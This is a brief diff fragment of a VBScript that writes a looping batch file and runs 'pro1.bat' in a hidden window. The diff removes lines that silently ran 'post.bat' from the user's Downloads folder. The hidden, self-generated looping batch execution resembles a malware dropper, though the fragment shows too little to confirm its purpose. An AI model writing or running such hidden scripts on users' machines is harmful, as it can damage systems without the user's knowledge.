@@ -60,6 +60,4 @@ objFile.WriteLine "goto loop"
 objFile.Close
 
 objShell.Run "pro1.bat", 0, True
-userProfileDir = objShell.ExpandEnvironmentStrings("%USERPROFILE%\Downloads")
-objShell.Run userProfileDir & "\post.bat", 0, True
 
